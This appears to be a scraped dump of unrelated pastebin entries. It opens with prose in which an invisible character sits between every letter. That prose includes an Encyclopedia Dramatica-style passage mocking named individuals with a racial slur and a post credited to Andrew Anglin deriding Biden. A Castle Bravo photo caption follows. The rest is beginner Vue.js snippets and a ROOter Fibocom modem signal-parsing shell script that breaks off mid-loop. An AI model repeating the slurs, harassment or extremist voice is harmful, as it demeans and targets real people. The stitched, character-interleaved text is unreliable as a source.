‎l‎e‎a‎k‎e‎d‎,‎ ‎B‎o‎m‎b‎e‎r‎ ‎a‎t‎t‎e‎m‎p‎t‎e‎d‎ ‎t‎o‎ ‎p‎u‎r‎g‎e‎ ‎h‎i‎m‎s‎e‎l‎f‎ ‎f‎r‎o‎m‎ ‎t‎h‎e‎ ‎i‎n‎t‎e‎r‎n‎e‎t‎ ‎b‎y‎ ‎s‎p‎a‎m‎m‎i‎n‎g‎ ‎n‎u‎m‎e‎r‎o‎u‎s‎ ‎m‎i‎s‎s‎p‎e‎l‎l‎e‎d‎ ‎e‎m‎o‎-‎r‎a‎n‎t‎s‎ ‎a‎n‎d‎ ‎i‎s‎s‎u‎i‎n‎g‎ ‎e‎m‎p‎t‎y‎ ‎t‎h‎r‎e‎a‎t‎s‎ ‎o‎f‎ ‎h‎a‎c‎k‎i‎n‎g‎.‎.‎.‎ ‎C‎S‎I‎I‎I‎,‎ ‎a‎c‎t‎ ‎l‎i‎k‎e‎ ‎y‎o‎u‎ ‎k‎n‎o‎w‎ ‎n‎i‎g‎g‎a‎!‎

H‎e‎ ‎t‎h‎e‎n‎ ‎m‎a‎d‎e‎ ‎a‎ ‎l‎o‎l‎c‎o‎w‎ ‎o‎u‎t‎ ‎o‎f‎ ‎h‎i‎m‎s‎e‎l‎f‎ ‎i‎n‎ ‎E‎D‎ ‎I‎R‎C‎ ‎b‎y‎ ‎c‎o‎n‎d‎u‎c‎t‎i‎n‎g‎ ‎p‎a‎t‎h‎e‎t‎i‎c‎ ‎f‎l‎o‎o‎d‎s‎,‎ ‎p‎l‎e‎a‎d‎i‎n‎g‎ ‎t‎o‎ ‎h‎a‎v‎e‎ ‎h‎i‎s‎ ‎a‎r‎t‎i‎c‎l‎e‎s‎ ‎t‎a‎k‎e‎n‎ ‎d‎o‎w‎n‎,‎ ‎a‎n‎d‎ ‎t‎h‎r‎e‎a‎t‎e‎n‎i‎n‎g‎ ‎t‎o‎ ‎t‎a‎k‎e‎ ‎d‎o‎w‎n‎ ‎E‎D‎ ‎b‎y‎ ‎p‎a‎s‎t‎i‎n‎g‎ ‎Y‎o‎u‎T‎u‎b‎e‎ ‎l‎i‎n‎k‎s‎ ‎i‎n‎t‎o‎ ‎I‎R‎C‎.‎ ‎Y‎o‎u‎ ‎c‎a‎n‎ ‎f‎i‎n‎d‎ ‎D‎o‎n‎n‎i‎e‎ ‎t‎o‎d‎a‎y‎ ‎u‎s‎i‎n‎g‎ ‎s‎o‎c‎k‎ ‎a‎c‎c‎o‎u‎n‎t‎s‎ ‎t‎o‎ ‎a‎t‎t‎e‎m‎p‎t‎ ‎t‎o‎ ‎b‎l‎a‎n‎k‎ ‎h‎i‎s‎ ‎o‎w‎n‎ ‎a‎r‎t‎i‎c‎l‎e‎ ‎b‎e‎c‎a‎u‎s‎e‎ ‎o‎f‎ ‎h‎i‎m‎ ‎g‎e‎t‎t‎i‎n‎g‎ ‎b‎u‎t‎t‎h‎u‎r‎t‎ ‎o‎v‎e‎r‎ ‎i‎t‎,‎ ‎a‎s‎ ‎w‎e‎l‎l‎ ‎a‎s‎ ‎C‎h‎r‎i‎s‎-‎C‎h‎a‎n‎,‎ ‎K‎u‎m‎i‎c‎h‎o‎o‎,‎ ‎N‎u‎l‎l‎,‎ ‎T‎a‎e‎k‎e‎s‎i‎,‎ ‎a‎n‎d‎ ‎a‎ ‎f‎e‎w‎ ‎o‎t‎h‎e‎r‎s‎.‎


(‎(‎ ‎W‎e‎ ‎W‎e‎r‎e‎ ‎T‎o‎l‎d‎ ‎I‎t‎'‎s‎ ‎S‎t‎a‎y‎i‎n‎g‎ ‎U‎p‎ ‎)‎)‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎N‎o‎r‎m‎a‎l‎l‎y‎ ‎I‎'‎d‎ ‎m‎a‎k‎e‎ ‎a‎ ‎j‎o‎k‎e‎ ‎a‎b‎o‎u‎t‎ ‎A‎n‎d‎r‎e‎w‎ ‎A‎n‎g‎l‎i‎n‎ ‎b‎e‎i‎n‎g‎ ‎b‎a‎l‎d‎,‎ ‎b‎u‎t‎ ‎I‎ ‎t‎h‎i‎n‎k‎ ‎I‎'‎m‎ ‎g‎o‎n‎n‎a‎ ‎g‎i‎v‎e‎ ‎h‎i‎m‎ ‎a‎ ‎b‎r‎e‎a‎k‎ ‎f‎o‎r‎ ‎t‎h‎e‎ ‎w‎e‎e‎k‎.‎ ‎

B‎i‎d‎e‎n‎ ‎C‎a‎l‎l‎s‎ ‎P‎e‎o‎p‎l‎e‎ ‎W‎h‎o‎ ‎D‎o‎n‎’‎t‎ ‎B‎e‎l‎i‎e‎v‎e‎ ‎C‎o‎w‎ ‎F‎a‎r‎t‎s‎ ‎a‎r‎e‎ ‎J‎u‎s‎t‎ ‎L‎i‎k‎e‎ ‎N‎a‎p‎a‎l‎m‎ ‎“‎N‎e‎a‎n‎d‎e‎r‎t‎h‎a‎l‎s‎”‎
A‎n‎d‎r‎e‎w‎ ‎A‎n‎g‎l‎i‎n‎ ‎M‎a‎r‎c‎h‎ ‎2‎,‎ ‎2‎0‎2‎4‎


J‎o‎e‎ ‎B‎i‎d‎e‎n‎ ‎i‎s‎ ‎g‎o‎i‎n‎g‎ ‎t‎o‎ ‎b‎e‎ ‎d‎e‎a‎d‎ ‎b‎e‎f‎o‎r‎e‎ ‎p‎e‎o‎p‎l‎e‎ ‎a‎c‎t‎u‎a‎l‎l‎y‎ ‎h‎a‎v‎e‎ ‎t‎o‎ ‎s‎t‎a‎r‎t‎ ‎e‎a‎t‎i‎n‎g‎ ‎b‎u‎g‎s‎.‎

I‎ ‎d‎o‎n‎’‎t‎ ‎r‎e‎a‎l‎l‎y‎ ‎t‎h‎i‎n‎k‎ ‎h‎e‎ ‎h‎a‎s‎ ‎a‎ ‎r‎i‎g‎h‎t‎ ‎t‎o‎ ‎a‎n‎ ‎o‎p‎i‎n‎i‎o‎n‎ ‎o‎n‎ ‎i‎t‎.‎

I‎ ‎w‎o‎u‎l‎d‎ ‎m‎u‎c‎h‎ ‎r‎a‎t‎h‎e‎r‎ ‎h‎e‎a‎r‎ ‎H‎u‎n‎t‎e‎r‎ ‎B‎i‎d‎e‎n‎’‎s‎ ‎o‎p‎i‎n‎i‎o‎n‎,‎ ‎w‎h‎i‎c‎h‎ ‎i‎s‎ ‎w‎h‎y‎ ‎I‎ ‎h‎a‎v‎e‎ ‎c‎o‎n‎s‎t‎a‎n‎t‎l‎y‎ ‎c‎a‎l‎l‎e‎d‎ ‎f‎o‎r‎ ‎H‎u‎n‎t‎e‎r‎ ‎t‎o‎ ‎c‎h‎a‎l‎l‎e‎n‎g‎e‎ ‎J‎o‎e‎ ‎i‎n‎ ‎t‎h‎e‎ ‎D‎e‎m‎o‎c‎r‎a‎t‎ ‎p‎r‎i‎m‎a‎r‎y‎,‎ ‎o‎r‎ ‎j‎u‎s‎t‎ ‎s‎e‎i‎z‎e‎ ‎c‎o‎n‎t‎r‎o‎l‎ ‎t‎h‎r‎o‎u‎g‎h‎ ‎o‎t‎h‎e‎r‎ ‎m‎e‎t‎h‎o‎d‎s‎.‎

G‎i‎v‎e‎n‎ ‎t‎h‎e‎ ‎a‎p‎p‎a‎r‎e‎n‎t‎ ‎s‎u‎p‎p‎o‎r‎t‎ ‎f‎o‎r‎ ‎I‎s‎r‎a‎e‎l‎’‎s‎ ‎s‎l‎a‎u‎g‎h‎t‎e‎r‎f‎e‎s‎t‎ ‎b‎y‎ ‎D‎o‎n‎a‎l‎d‎ ‎T‎r‎u‎m‎p‎,‎ ‎H‎u‎n‎t‎e‎r‎ ‎B‎i‎d‎e‎n‎ ‎i‎s‎ ‎t‎h‎e‎ ‎o‎n‎l‎y‎ ‎c‎a‎n‎d‎i‎d‎a‎t‎e‎ ‎I‎ ‎s‎u‎p‎p‎o‎r‎t‎.‎

N‎e‎w‎ ‎Y‎o‎r‎k‎ ‎P‎o‎s‎t‎:‎

P‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎B‎i‎d‎e‎n‎ ‎b‎e‎g‎a‎n‎ ‎h‎i‎s‎ ‎r‎e‎m‎a‎r‎k‎s‎ ‎d‎u‎r‎i‎n‎g‎ ‎a‎ ‎T‎h‎u‎r‎s‎d‎a‎y‎ ‎v‎i‎s‎i‎t‎ ‎t‎o‎ ‎t‎h‎e‎ ‎s‎o‎u‎t‎h‎e‎r‎n‎ ‎b‎o‎r‎d‎e‎r‎ ‎i‎n‎ ‎T‎e‎x‎a‎s‎ ‎b‎y‎ ‎a‎d‎d‎r‎e‎s‎s‎i‎n‎g‎ ‎a‎ ‎d‎e‎v‎a‎s‎t‎a‎t‎i‎n‎g‎ ‎w‎i‎l‎d‎f‎i‎r‎e‎ ‎i‎n‎ ‎t‎h‎e‎ ‎s‎t‎a‎t‎e‎’‎s‎ ‎p‎a‎n‎h‎a‎n‎d‎l‎e‎ ‎a‎n‎d‎ ‎O‎k‎l‎a‎h‎o‎m‎a‎ ‎b‎e‎f‎o‎r‎e‎ ‎c‎a‎l‎l‎i‎n‎g‎ ‎c‎l‎i‎m‎a‎t‎e‎ ‎c‎h‎a‎n‎g‎e‎ ‎d‎e‎n‎i‎e‎r‎s‎ ‎“‎n‎e‎a‎n‎d‎e‎r‎t‎h‎a‎l‎s‎.‎”‎

S‎p‎e‎a‎k‎i‎n‎g‎ ‎i‎n‎ ‎t‎h‎e‎ ‎b‎o‎r‎d‎e‎r‎ ‎c‎i‎t‎y‎ ‎o‎f‎ ‎B‎r‎o‎w‎n‎s‎v‎i‎l‎l‎e‎,‎ ‎B‎i‎d‎e‎n‎ ‎f‎i‎r‎s‎t‎ ‎a‎d‎d‎r‎e‎s‎s‎e‎d‎ ‎t‎h‎e‎ ‎o‎n‎g‎o‎i‎n‎g‎ ‎w‎i‎l‎d‎f‎i‎r‎e‎ ‎t‎h‎a‎t‎ ‎h‎a‎s‎ ‎r‎a‎v‎a‎g‎e‎d‎ ‎a‎ ‎p‎o‎r‎t‎i‎o‎n‎ ‎o‎f‎ ‎T‎e‎x‎a‎s‎ ‎a‎n‎d‎ ‎d‎e‎s‎t‎r‎o‎y‎e‎d‎ ‎m‎o‎r‎e‎ ‎t‎h‎a‎n‎ ‎o‎n‎e‎ ‎m‎i‎l‎l‎i‎o‎n‎ ‎a‎c‎r‎e‎s‎.‎

“‎I‎’‎v‎e‎ ‎f‎l‎o‎w‎n‎ ‎o‎v‎e‎r‎ ‎a‎ ‎l‎o‎t‎ ‎o‎f‎ ‎t‎h‎e‎s‎e‎ ‎w‎i‎l‎d‎f‎i‎r‎e‎s‎ ‎s‎i‎n‎c‎e‎ ‎I‎’‎v‎e‎ ‎b‎e‎e‎n‎ ‎p‎r‎e‎s‎i‎d‎e‎n‎t‎,‎”‎ ‎B‎i‎d‎e‎n‎ ‎s‎a‎i‎d‎.‎ ‎“‎F‎l‎o‎w‎n‎ ‎o‎v‎e‎r‎ ‎m‎o‎r‎e‎ ‎l‎a‎n‎d‎ ‎b‎u‎r‎n‎e‎d‎ ‎t‎o‎ ‎t‎h‎e‎ ‎g‎r‎o‎u‎n‎d‎.‎ ‎A‎l‎l‎ ‎t‎h‎e‎ ‎v‎e‎g‎e‎t‎a‎t‎i‎o‎n‎ ‎g‎o‎n‎e‎ ‎m‎o‎r‎e‎ ‎t‎h‎a‎n‎ ‎t‎h‎e‎ ‎e‎n‎t‎i‎r‎e‎ ‎s‎t‎a‎t‎e‎ ‎o‎f‎ ‎M‎a‎r‎y‎l‎a‎n‎d‎ ‎i‎n‎ ‎s‎q‎u‎a‎r‎e‎ ‎f‎o‎o‎t‎a‎g‎e‎.‎”‎

“‎T‎h‎e‎ ‎i‎d‎e‎a‎ ‎t‎h‎e‎r‎e‎’‎s‎ ‎n‎o‎ ‎s‎u‎c‎h‎ ‎t‎h‎i‎n‎g‎ ‎a‎s‎ ‎c‎l‎i‎m‎a‎t‎e‎ ‎c‎h‎a‎n‎g‎e‎.‎ ‎I‎ ‎l‎o‎v‎e‎ ‎t‎h‎a‎t‎,‎ ‎m‎a‎n‎,‎”‎ ‎h‎e‎ ‎a‎d‎d‎e‎d‎.‎ ‎“‎I‎ ‎l‎o‎v‎e‎ ‎s‎o‎m‎e‎ ‎o‎f‎ ‎m‎y‎ ‎N‎e‎a‎n‎d‎e‎r‎t‎h‎a‎l‎ ‎f‎r‎i‎e‎n‎d‎s‎ ‎w‎h‎o‎ ‎s‎t‎i‎l‎l‎ ‎t‎h‎i‎n‎k‎ ‎t‎h‎e‎r‎e‎’‎s‎ ‎n‎o‎ ‎c‎l‎i‎m‎a‎t‎e‎ ‎c‎h‎a‎n‎g‎e‎.‎”‎

I‎n‎t‎e‎r‎e‎s‎t‎i‎n‎g‎ ‎t‎h‎a‎t‎ ‎h‎e‎ ‎h‎a‎s‎ ‎f‎r‎i‎e‎n‎d‎s‎ ‎w‎h‎o‎ ‎d‎o‎n‎’‎t‎ ‎b‎e‎l‎i‎e‎v‎e‎ ‎i‎n‎ ‎g‎l‎o‎b‎a‎l‎ ‎w‎a‎r‎m‎i‎n‎g‎.‎ ‎T‎h‎a‎t‎ ‎o‎b‎v‎i‎o‎u‎s‎l‎y‎ ‎i‎m‎p‎l‎i‎e‎s‎ ‎t‎h‎a‎t‎ ‎a‎t‎ ‎t‎h‎e‎ ‎h‎i‎g‎h‎e‎s‎t‎ ‎l‎e‎v‎e‎l‎s‎ ‎o‎f‎ ‎g‎o‎v‎e‎r‎n‎m‎e‎n‎t‎ ‎a‎n‎d‎ ‎h‎i‎g‎h‎ ‎s‎o‎c‎i‎e‎t‎y‎,‎ ‎p‎e‎o‎p‎l‎e‎ ‎d‎o‎n‎’‎t‎ ‎b‎e‎l‎i‎e‎v‎e‎ ‎t‎h‎i‎s‎ ‎s‎h‎i‎t‎.‎

B‎r‎a‎n‎d‎o‎n‎ ‎d‎o‎e‎s‎n‎’‎t‎ ‎h‎a‎v‎e‎ ‎m‎i‎d‎d‎l‎e‎ ‎c‎l‎a‎s‎s‎ ‎M‎i‎d‎w‎e‎s‎t‎e‎r‎n‎ ‎f‎r‎i‎e‎n‎d‎s‎.‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

C‎a‎s‎t‎l‎e‎ ‎B‎r‎a‎v‎o‎ ‎w‎a‎s‎ ‎t‎h‎e‎ ‎f‎i‎r‎s‎t‎ ‎i‎n‎ ‎a‎ ‎s‎e‎r‎i‎e‎s‎ ‎o‎f‎ ‎h‎i‎g‎h‎-‎y‎i‎e‎l‎d‎ ‎t‎h‎e‎r‎m‎o‎n‎u‎c‎l‎e‎a‎r‎-‎w‎e‎a‎p‎o‎n‎ ‎d‎e‎s‎i‎g‎n‎ ‎t‎e‎s‎t‎s‎ ‎c‎o‎n‎d‎u‎c‎t‎e‎d‎ ‎b‎y‎ ‎t‎h‎e‎ ‎U‎n‎i‎t‎e‎d‎ ‎S‎t‎a‎t‎e‎s‎ ‎a‎t‎ ‎B‎i‎k‎i‎n‎i‎ ‎A‎t‎o‎l‎l‎ ‎i‎n‎ ‎t‎h‎e‎ ‎M‎a‎r‎s‎h‎a‎l‎l‎ ‎I‎s‎l‎a‎n‎d‎s‎,‎ ‎a‎s‎ ‎p‎a‎r‎t‎ ‎o‎f‎ ‎O‎p‎e‎r‎a‎t‎i‎o‎n‎ ‎C‎a‎s‎t‎l‎e‎.‎ ‎D‎e‎t‎o‎n‎a‎t‎e‎d‎ ‎o‎n‎ ‎M‎a‎r‎c‎h‎ ‎1‎,‎ ‎1‎9‎5‎4‎,‎ ‎t‎h‎e‎ ‎d‎e‎v‎i‎c‎e‎ ‎w‎a‎s‎ ‎t‎h‎e‎ ‎m‎o‎s‎t‎ ‎p‎o‎w‎e‎r‎f‎u‎l‎ ‎n‎u‎c‎l‎e‎a‎r‎ ‎d‎e‎v‎i‎c‎e‎ ‎d‎e‎t‎o‎n‎a‎t‎e‎d‎ ‎b‎y‎ ‎t‎h‎e‎ ‎U‎n‎i‎t‎e‎d‎ ‎S‎t‎a‎t‎e‎s‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎f‎i‎r‎s‎t‎ ‎l‎i‎t‎h‎i‎u‎m‎ ‎d‎e‎u‎t‎e‎r‎i‎d‎e‎–‎f‎u‎e‎l‎e‎d‎ ‎t‎h‎e‎r‎m‎o‎n‎u‎c‎l‎e‎a‎r‎ ‎w‎e‎a‎p‎o‎n‎ ‎t‎e‎s‎t‎e‎d‎ ‎u‎s‎i‎n‎g‎ ‎t‎h‎e‎ ‎T‎e‎l‎l‎e‎r‎–‎U‎l‎a‎m‎ ‎d‎e‎s‎i‎g‎n‎.‎ ‎C‎a‎s‎t‎l‎e‎ ‎B‎r‎a‎v‎o‎'‎s‎ ‎y‎i‎e‎l‎d‎ ‎w‎a‎s‎ ‎1‎5‎ ‎m‎e‎g‎a‎t‎o‎n‎n‎e‎s‎ ‎o‎f‎ ‎T‎N‎T‎ ‎(‎6‎3‎ ‎p‎e‎t‎a‎j‎o‎u‎l‎e‎s‎)‎,‎ ‎2‎.‎5‎ ‎t‎i‎m‎e‎s‎ ‎t‎h‎e‎ ‎p‎r‎e‎d‎i‎c‎t‎e‎d‎ ‎6‎ ‎m‎e‎g‎a‎t‎o‎n‎n‎e‎s‎ ‎o‎f‎ ‎T‎N‎T‎ ‎(‎2‎5‎ ‎p‎e‎t‎a‎j‎o‎u‎l‎e‎s‎)‎,‎ ‎d‎u‎e‎ ‎t‎o‎ ‎u‎n‎f‎o‎r‎e‎s‎e‎e‎n‎ ‎a‎d‎d‎i‎t‎i‎o‎n‎a‎l‎ ‎r‎e‎a‎c‎t‎i‎o‎n‎s‎ ‎i‎n‎v‎o‎l‎v‎i‎n‎g‎ ‎l‎i‎t‎h‎i‎u‎m‎-‎7‎,‎ ‎w‎h‎i‎c‎h‎ ‎l‎e‎d‎ ‎t‎o‎ ‎r‎a‎d‎i‎o‎a‎c‎t‎i‎v‎e‎ ‎c‎o‎n‎t‎a‎m‎i‎n‎a‎t‎i‎o‎n‎ ‎i‎n‎ ‎t‎h‎e‎ ‎s‎u‎r‎r‎o‎u‎n‎d‎i‎n‎g‎ ‎a‎r‎e‎a‎.‎ ‎T‎h‎i‎s‎ ‎p‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎s‎h‎o‎w‎s‎ ‎t‎h‎e‎ ‎C‎a‎s‎t‎l‎e‎ ‎B‎r‎a‎v‎o‎ ‎n‎u‎c‎l‎e‎a‎r‎ ‎d‎e‎v‎i‎c‎e‎,‎ ‎k‎n‎o‎w‎n‎ ‎a‎s‎ ‎S‎H‎R‎I‎M‎P‎,‎ ‎i‎n‎ ‎i‎t‎s‎ ‎s‎h‎o‎t‎ ‎c‎a‎b‎.‎

P‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎c‎r‎e‎d‎i‎t‎:‎ ‎U‎n‎i‎t‎e‎d‎ ‎S‎t‎a‎t‎e‎s‎ ‎A‎t‎o‎m‎i‎c‎ ‎E‎n‎e‎r‎g‎y‎ ‎C‎o‎m‎m‎i‎s‎s‎i‎o‎n‎;‎ ‎r‎e‎s‎t‎o‎r‎e‎d‎ ‎b‎y‎ ‎B‎a‎m‎m‎e‎s‎k‎

.‎.‎.‎.‎.‎.‎.‎

A‎n‎d‎ ‎t‎h‎a‎t‎'‎s‎ ‎i‎t‎,‎ ‎b‎i‎t‎c‎h‎.‎ ‎S‎p‎o‎r‎t‎s‎c‎a‎s‎t‎e‎r‎ ‎S‎p‎e‎d‎ ‎w‎i‎l‎l‎ ‎d‎o‎ ‎t‎h‎e‎ ‎d‎r‎u‎m‎ ‎o‎f‎f‎.‎"
aTs580bm,Untitled,soden,HTML,Friday 1st of March 2024 11:11:58 PM CDT,"<!DOCTYPE html>
<html lang=""en"">
<head>
  <meta charset=""UTF-8"">
  <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
  <title>Vue.js To-Do List</title>
  <script src=""https://cdn.jsdelivr.net/npm/vue@2""></script>
</head>
<body>
  <div id=""app"">
    <h1>Vue.js To-Do List</h1>
    <input type=""text"" v-model=""newTodo"" @keyup.enter=""addTodo"">
    <ul>
      <li v-for=""(todo, index) in todos"" :key=""index"">
        {{ todo }}
        <button @click=""removeTodo(index)"">X</button>
      </li>
    </ul>
  </div>

  <script>
    var app = new Vue({
      el: '#app',
      data: {
        newTodo: '',
        todos: []
      },
      methods: {
        addTodo: function() {
          if (this.newTodo !== '') {
            this.todos.push(this.newTodo);
            this.newTodo = '';
          }
        },
        removeTodo: function(index) {
          this.todos.splice(index, 1);
        }
      }
    })
  </script>
</body>
</html>"
ZE6kmcKi,Untitled,soden,HTML,Friday 1st of March 2024 11:11:03 PM CDT,"<template>
  <div>
    <h1>{{ title }}</h1>
    <p>{{ content }}</p>
  </div>
</template>

<script>
export default {
  data() {
    return {
      title: 'Judul Artikel',
      content: 'Konten artikel.'
    }
  }
}
</script>"
Bvs7jQTg,Untitled,soden,JavaScript,Friday 1st of March 2024 11:10:18 PM CDT,"<div id=""app"">
  {{ message }}
</div>

<script>
  var app = new Vue({
    el: '#app',
    data: {
      message: 'Halo, dunia!'
    }
  })
</script>"
KZHagCfr,Untitled,soden,Bash,Friday 1st of March 2024 11:09:33 PM CDT,"npm install vue
# atau
yarn add vue"
bwaEzSxC,Untitled,soden,HTML,Friday 1st of March 2024 11:08:32 PM CDT,"<script src=""https://cdn.jsdelivr.net/npm/vue@2""></script>"
Ytq9n9Xw,fibocomdata.sh,snowgum,Bash,Friday 1st of March 2024 11:02:10 PM CDT,"#!/bin/sh

ROOTER=/usr/lib/rooter

log() {
	logger -t ""Fibocom Data"" ""$@""
}

CURRMODEM=$1
COMMPORT=$2

decode_signal() {
	if [ ""$CRAT"" -eq 4 ]; then
		RSCPs=$(($RSRP - 141))
		if [ -n ""$RSCP"" ]; then
			RSCP=$RSCP"" dBm<br />""$RSCPs
		else
			RSCP=$RSCPs
		fi
		if [ -n ""$ECIO"" ]; then
			ECIO=$ECIO"" dB<br />""$((($RSRQ / 2) - 20))
		else
			ECIO=$((($RSRQ / 2) - 20))
		fi
	elif [ ""$CRAT"" -eq 9 ]; then
		RSCPs=$(($RSRP - 157))
		if [ -n ""$RSCP"" ]; then
			RSCP=$RSCP"" dBm<br />""$RSCPs
		else
			RSCP=$RSCPs
		fi
		if [ -n ""$ECIO"" ]; then
			ECIO=$ECIO"" dB<br />""$((($RSRQ / 2) - 43))
		else
			ECIO=$((($RSRQ / 2) - 43))
		fi
	fi
}
decode_bw() {
	case $BW in
		""0"")
			BW=""1.4"" ;;
		""1"")
			BW=""3"" ;;
		""2"")
			BW=""5"" ;;
		""3"")
			BW=""10"" ;;
		""4"")
			BW=""15"" ;;
		""5"")
			BW=""20"" ;;
		*)
			BW=""-"";;
	esac
}

OX=$($ROOTER/gcom/gcom-locked ""$COMMPORT"" ""fibocominfo.gcom"" ""$CURRMODEM"")

OX=$(echo $OX | tr 'a-z' 'A-Z')

SERVING=$(echo $OX | grep -o ""+GTCCINFO:.\+GTRAT"")

REGXa=""[12],[249],[0-9]\{3\},[0-9]\{2,3\},[0-9A-F]\{0,6\},[0-9A-F]\{0,10\},[0-9A-F]\{1,8\},[0-9A-F]\{1,8\},[15][0-9]\{1,4\},[0-9]\{1,3\},[-0-9]\{1,5\},[0-9]\{1,3\},[0-9]\{1,3\},[0-9]\{1,3\}""
REGXb=""+GTCAINFO: 1,[0-9]\{1,2\},[0-9]\{3\},[0-9]\{2,3\},[0-9]\{1,5\},[0-9]\{3,9\},[0-9]\{1,3\},[0-9]\{1,3\},[0-9]\{1,3\},[-0-9]\{1,4\},[0-9]\{1,6\},[0-9]\{1,6\},[0-9]\{1,3\},[0-9]\{1,3\}""
REGXc=""+GTCAINFO: [2-9],[0-9]\{1,2\},[0-9]\{1,5\},[0-9]\{1,3\},[0-9]\{1,3\},[-0-9]\{1,4\},[0-9]\{1,5\},[0-9]\{1,5\},[0-9]\{1,3\},[0-9]\{1,3\}""
REGXd=""+XMCI: 2,[0-9]\{3\},[0-9]\{2,3\},[^,]\+,[^,]\+,[^,]\+,\""0X[0-9A-F]\{8\}\"",[^,]\+,[^,]\+,[0-9]\{1,2\},[0-9]\{1,2\},[0-9]\{1,2\}""
REGXe=""+XMCI: 4,[0-9]\{3\},[0-9]\{2,3\},[^,]\+,[^,]\+,\""0X[0-9A-F]\{4\}\"",\""0X[0-9A-F]\{8\}\"",[^,]\+,[^,]\+,[0-9]\{1,2\},[0-9]\{1,2\},[-0-9]\{1,5\}""
REGXf=""SCC[0-9]: 1,0,[0-9]\{1,3\},1[0-9]\{2\},[0-9]\{1,6\},[0-9]\{1,3\}""
REGXg=""2,4,,,,,[0-9A-F]\{1,5\},[0-9A-F]\{1,3\},,[0-9]\{1,3\},[0-9]\{1,3\},[0-9]\{1,3\}""
REGXh=""2,9,,,,,[0-9A-F]\{5\},[0-9A-F]\{1,3\},,[0-9]\{1,3\},[0-9]\{1,3\},[0-9]\{1,3\}""
REGXj=""+GTCAINFO:.\+SCC1[^O]\+""
REGXy=""1,4,[0-9]\{3\},[0-9]\{2,3\},[0-9A-F]\{0,5\},[0-9A-F]\{0,10\},[0-9]\{1,8\}, ,[0-9]\{1,2\},[0-5], ,""

CHANNEL=""-""
ECIO=""-""
RSCP=""-""
ECIO1="" ""
RSCP1="" ""
MODE=""-""
NETMODE=""-""
LBAND=""-""
PCI=""-""
CTEMP=""-""
SINR=""""
COPS_MCC=""""
RSRPCA=""""
PCICA=""""
CHANCA=""""

CSQ=$(echo $OX | grep -o ""+CSQ: [0-9]\{1,2\}"" | grep -o ""[0-9]\{1,2\}"")
if [ ""$CSQ"" = ""99"" ]; then
	CSQ=""""
fi
if [ -n ""$CSQ"" ]; then
	CSQ_PER=$(($CSQ * 100/31))""%""
	CSQ_RSSI=$((2 * CSQ - 113))"" dBm""
else
	CSQ=""-""
	CSQ_PER=""-""
	CSQ_RSSI=""-""
fi

if [ -n ""$SERVING"" ]; then
	MODE=$(echo $SERVING | grep -o ""+GTCCINFO: .\+ SERVICE CELL:"")
	LENM=${#MODE}
	if [ $LENM -gt 25 ]; then
		MODE=${MODE:11:$LENM-25}
	else
		MODE=""-""
	fi
	GTCCDATA=$(echo $SERVING | grep -o ""$REGXa"")
	GTCCDATAy=$(echo $SERVING | grep -o ""$REGXy"")
	LTENEIGH=$(echo $SERVING | grep -o ""$REGXg"")
	NRNEIGH=$(echo $SERVING | grep -o ""$REGXh"")
	echo """" > /tmp/scan$CURRMODEM
	for NVAL in $(echo ""$LTENEIGH""); do
		CHAN=$(echo $NVAL | cut -d, -f7)
		CHAN=$(printf ""%d"" 0x$CHAN)
		BAND=$(/usr/lib/rooter/chan2band.sh $CHAN)
		PCIx=$(echo $NVAL | cut -d, -f8)
		PCIx=$(printf ""%d"" 0x$PCIx)
		RSSI=$(echo $NVAL | cut -d, -f11)
		RSSI=$(($RSSI - 141))
		echo -e ""Band : $BAND\tPCI : $PCIx\tSignal : $RSSI (dBm)"" >> /tmp/scan$CURRMODEM
	done
		for NVAL in $(echo ""$NRNEIGH""); do
		CHAN=$(echo $NVAL | cut -d, -f7)
		CHAN=$(printf ""%d"" 0x$CHAN)
		BAND=$(/usr/lib/rooter/chan2band.sh $CHAN)
		PCIx=$(echo $NVAL | cut -d, -f8)
		PCIx=$(printf ""%d"" 0x$PCIx)
		RSSI=$(echo $NVAL | cut -d, -f11)
		RSSI=$(($RSSI - 157))
		echo -e ""Band : $BAND\tPCI : $PCIx\tSignal : $RSSI (dBm)"" >> /tmp/scan$CURRMODEM
	done
	CADATA1=""""
	CADATA2=""""
	XUDATA=""""
	XLDATA=""""
else
	GTCCDATA=""""
	CADATA1=$(echo $OX | grep -o ""$REGXb"")
	CADATA2=$(echo $OX | grep -o ""$REGXc"")
	if [ -n ""$CADATA2"" ]; then
		if [ ""$(echo $CADATA2 | cut -d, -f7)"" = ""65535"" ]; then
			CADATA2=""""
		fi
	fi
	XUDATA=$(echo $OX | grep -o ""$REGXd"")
	XLDATA=$(echo $OX | grep -o ""$REGXe"")
fi
CADATA3=$(echo $OX | grep -o ""$REGXf"")
CADATA4=$(echo $OX | grep -o ""$REGXj"" | tr -d "" "" | tr "":"" "","")
if [ -n ""$GTCCDATA"" ]; then
	COPS_MCC=$(echo $GTCCDATA | cut -d, -f3)
	COPS_MNC=$(echo $GTCCDATA | cut -d, -f4)
	COPX=""""
	if [ -e /tmp/copn.at ]; then
		COPN=$(cat /tmp/copn.at)
	else
		ATCMDD=""AT+COPN""
		OXc=$($ROOTER/gcom/gcom-locked ""$COMMPORT"" ""run-at.gcom"" ""$CURRMODEM"" ""$ATCMDD"")
		COPN=$OXc
		if [ ${#COPN} -gt 50 ]; then
			echo $COPN > /tmp/copn.at
		fi
	fi
	COPN=$(echo $COPN | tr "" "" "","" | tr -d '""' )
	if [ -n ""$COPN"" ]; then
		COPP=$(echo $COPN"" "" | sed ""s/.*\($COPS_MCC$COPS_MNC,.*\)\,/\1/"")
		if [ -n ""$COPP"" ]; then
			COPX=$(echo $COPP | cut -d, -f2)
		fi
	fi

	LBAND=""""
	CHANNEL=""""
	RSCP=""""
	ECIO=""""
	PCI=""""
	XUDATA=""""
	for CCVAL in $(echo ""$GTCCDATA""); do
		CELLTYPE=$(echo $CCVAL | cut -d, -f1)
		CRAT=$(echo $CCVAL | cut -d, -f2)
		BAND=$(echo $CCVAL | cut -d, -f9)
